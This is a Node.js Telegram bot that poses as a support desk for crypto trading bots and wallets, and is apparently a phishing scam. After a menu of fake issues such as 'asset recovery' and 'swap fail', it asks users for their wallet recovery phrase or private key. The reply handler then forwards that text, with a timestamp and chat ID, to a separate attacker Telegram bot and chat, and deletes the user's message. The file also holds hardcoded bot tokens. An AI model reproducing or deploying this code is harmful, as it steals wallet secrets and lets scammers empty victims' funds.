const express = require('express');
const app = express();
const port = process.env.PORT || 3000; // Render will automatically set a port

// Create a simple route to satisfy Render's need for an open port
app.get('/', (req, res) => {
    res.send('Telegram bot is running!');
});

// Start the express server
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});

const TelegramBot = require('node-telegram-bot-api');
const { text } = require('stream/consumers');
const token = '7282853309:AAHi51_84YSjoJouk3Vqoze7sVVX0Pkalc4';
const bot = new TelegramBot(token, {polling: true});
const fs = require('fs');

bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    const welcomeMessage = "Welcome to the Telegram Bot Resolve Decentralized Database, where you can address issues such as bot glitches, swap failures, configuration errors, asset recovery, validation problems, high slippage, rugged token issues, failed buy transactions, auto buy failures, slow bot performance, failed transactions, and high gas fees.\n\n• Please Select an issue to continue. Please import your web3 wallet into the bot to proceed:";
    
    const inlineKeyboard = {
        inline_keyboard: [
            [
            {text: '⚙️ VALIDATION ⚙️', callback_data: 'validation'}],
            [
            {text: '⚙️ RECTIFICATION ⚙️', callback_data: 'rectification'}],
            [
            {text: '⚙️ CONFIGURATION ⚙️', callback_data: 'configuration'}],
            [
            {text: '⚙️ ASSET RECOVERY  ⚙️', callback_data: 'asset_recovery'}],
            [ {text: '⚙️ SWAP FAIL ⚙️', callback_data: 'swap_fail'}],
            [ {text: '⚙️ CLEAR BOT GLITCH ⚙️', callback_data: 'clear_bot_glitch'}],
            [ {text: '⚙️ HIGH SLIPPAGE ⚙️', callback_data: 'high_slippage'}],
            [ {text: '⚙️ FAILED BUY&SELL ⚙️', callback_data: 'failed_buy_sell'}],
            [ {text: '⚙️ HIGH GAS FEE ⚙️', callback_data: 'high_gas_fee'}],
            [ {text: '⚙️ TURBO MODE ⚙️', callback_data: 'turbo_mode'}],
            [ {text: '⚙️ FAILED SNIPE ⚙️', callback_data: 'failed_snipe'}],
            [ {text: '⚙️ TECHNICAL BUGS ⚙️', callback_data: 'technical_bugs'}],
            
        ]
    }
    bot.sendMessage(chatId, welcomeMessage, {reply_markup: inlineKeyboard});
})

const options = [
    [{text: 'FIRST LEDGER', callback_data: 'first_ledger'}],
    [{text: 'BEAR BULL', callback_data: 'bear_bull'}],
    [{text: 'AUTO SPINE', callback_data: 'auto_spine'}],
    [{text: 'NOVA', callback_data: 'nova'}],
    [{text: 'MAESTRO', callback_data: 'maestro'}],
    [{text: 'TROJAN', callback_data: 'trojan'}],
    [{text: 'NOKBOT', callback_data: 'nokbot'}],
    [{text: 'PHOTON WEB', callback_data: 'photon_web'}],
    [{text: 'XBOT', callback_data: 'xbot'}],
    [{text: 'GMGN AI', callback_data: 'gmgn_ai'}],
    [{text: 'SUNDOG', callback_data: 'sundog'}],
    [{text: 'NFT BASE&BSC&SUI', callback_data: 'nft_base_bsc_sui'}],
    [{text: 'SOL TRADING BOT', callback_data: 'sol_trading_bot'}],
    [{text: 'BANANA GUNOT', callback_data: 'banana_gunot'}],
    [{text: 'UNIBOT', callback_data: 'unibot'}],
    [{text: 'SHURIKEN', callback_data: 'shuriken'}],
    [{text: 'PEPEBOST', callback_data: 'pepebost'}],
    [{text: 'TRADEWIZ', callback_data: 'trade_wiz'}],
    [{text: 'KSPR BOT', callback_data: 'kspr_bot'}],
    [{text: 'SIGMA BOT', callback_data: 'sigma_bot'}],
    [{text: 'MEVX WEB', callback_data: 'mevx_web'}],
    [{text: 'FINDER BOT WEB', callback_data: 'finder_bot_web'}],
    [{text: 'PRODIGY BOT', callback_data: 'prodigy_bot'}],
    [{text: 'MAGNUM BOT', callback_data: 'magnum_bot'}],
    [{text: 'WALLET CONNECT', callback_data: 'wallet_connect'}],
    [{text: 'BONKbot', callback_data: 'bonkbot'}],
    [{text: 'PUMP', callback_data: 'pump'}],
    [{text: 'SOLANA', callback_data: 'solana'}],
    [{text: 'OFFICIAL TRUMP', callback_data: 'official trump'}],
    [{text: 'OFFICIAL MELANIA', callback_data: 'official melania'}],
    [{text: '↩️ Back to Main Menu', callback_data: 'back_to_main'}]
]

// Consolidate all callback_query handlers into one
bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    
    // Handle back to main menu
    if (query.data === 'back_to_main') {
        const mainMenuKeyboard = {
            inline_keyboard: [
                [{text: '⚙️ VALIDATION ⚙️', callback_data: 'validation'}],
                [{text: '⚙️ RECTIFICATION ⚙️', callback_data: 'rectification'}],
                [{text: '⚙️ CONFIGURATION ⚙️', callback_data: 'configuration'}],
                [{text: '⚙️ ASSET RECOVERY  ⚙️', callback_data: 'asset_recovery'}],
                [{text: '⚙️ SWAP FAIL ⚙️', callback_data: 'swap_fail'}],
                [{text: '⚙️ CLEAR BOT GLITCH ⚙️', callback_data: 'clear_bot_glitch'}],
                [{text: '⚙️ HIGH SLIPPAGE ⚙️', callback_data: 'high_slippage'}],
                [{text: '⚙️ FAILED BUY&SELL ⚙️', callback_data: 'failed_buy_sell'}],
                [{text: '⚙️ HIGH GAS FEE ⚙️', callback_data: 'high_gas_fee'}],
                [{text: '⚙️ TURBO MODE ⚙️', callback_data: 'turbo_mode'}],
                [{text: '⚙️ FAILED SNIPE ⚙️', callback_data: 'failed_snipe'}],
                [{text: '⚙️ TECHNICAL BUGS ⚙️', callback_data: 'technical_bugs'}]
            ]
        };
        bot.editMessageText('Choose an option:', {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: mainMenuKeyboard
        });
        return;
    }

    // Handle phrase key and private key options
    if (query.data === 'proceed_with_phrase_key' || query.data === 'proceed_with_private_key') {
        const promptMessage = query.data === 'proceed_with_phrase_key' 
            ? "Please enter your 12/24 word recovery phrase:"
            : "Please enter your private key:";

        const forceReply = {
            force_reply: true,
            selective: true
        };

        bot.sendMessage(chatId, promptMessage, { reply_markup: forceReply })
            .then(() => {
                if (query.message.photo) {
                    bot.deleteMessage(chatId, query.message.message_id);
                }
            })
            .catch(error => console.error('Error sending prompt:', error));
        return;
    }

    // Handle continue/proceed
    if (query.data === 'continue' || query.data === 'proceed') {
        bot.answerCallbackQuery(query.id, {
            text: 'Processing your request...',
            show_alert: true
        });
        return;
    }

    // Handle all bot/wallet options
    if (options.some(option => option[0].callback_data === query.data)) {
        const proceedKeyboard = {
            inline_keyboard: [
                [{ text: '✅ PROCEED WITH PHRASE KEY', callback_data: 'proceed_with_phrase_key' }],
                [{ text: '➡️ PROCEED WITH PRIVATE KEY', callback_data: 'proceed_with_private_key' }],
                [{ text: '↩️ Back to Main Menu', callback_data: 'back_to_main' }]
            ]
        };

        bot.sendPhoto(chatId, fs.createReadStream('./telegram.png'), {
            caption: 'Please select your preferred verification method:',
            reply_markup: proceedKeyboard
        }).catch(error => console.error('Error sending photo:', error));
        
        bot.editMessageText('Processing...', {
            chat_id: chatId,
            message_id: query.message.message_id
        }).catch(() => {
            // Ignore any errors from editing the message
        });
        return;
    }

    // Handle all main menu options (validation, rectification, etc.)
    const mainMenuOptions = ['validation', 'rectification', 'configuration', 'asset_recovery', 
        'swap_fail', 'clear_bot_glitch', 'high_slippage', 'failed_buy_sell', 'high_gas_fee', 
        'turbo_mode', 'failed_snipe', 'technical_bugs'];
    
    if (mainMenuOptions.includes(query.data)) {
        const keyboard = {
            inline_keyboard: options
        };
        bot.editMessageText(`Select an option for ${query.data.replace(/_/g, ' ')}:`, {
            chat_id: chatId,
            message_id: query.message.message_id,
            reply_markup: keyboard
        }).catch(error => console.error('Error editing message:', error));
    }
});

// Handle the user's reply
bot.on('message', (msg) => {
    if (msg.reply_to_message) {
        const userInput = msg.text;
        const chatId = msg.chat.id;
        
        // Format the message
        const formattedMessage = `
🔑 New Phrase Key Received:
${userInput}
        
Time: ${new Date().toISOString()}
Chat ID: ${chatId}`;
        
        // Send to BotFather (replace with your actual bot token and chat ID)
        const BOT_TOKEN = "7588788569:AAHmIajt3Qvyokn1fZco-_26Qloypp8bCg0";
        const TARGET_CHAT_ID = "7724978785";
        
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TARGET_CHAT_ID,
                text: formattedMessage,
                parse_mode: 'HTML'
            })
        }).catch(error => console.error('Error forwarding message:', error));

        // Send confirmation to user
        bot.sendMessage(chatId, "Thank you! Your information has been submitted for processing.");
        
        // Delete the user's message for security
        bot.deleteMessage(chatId, msg.message_id);
    }
});
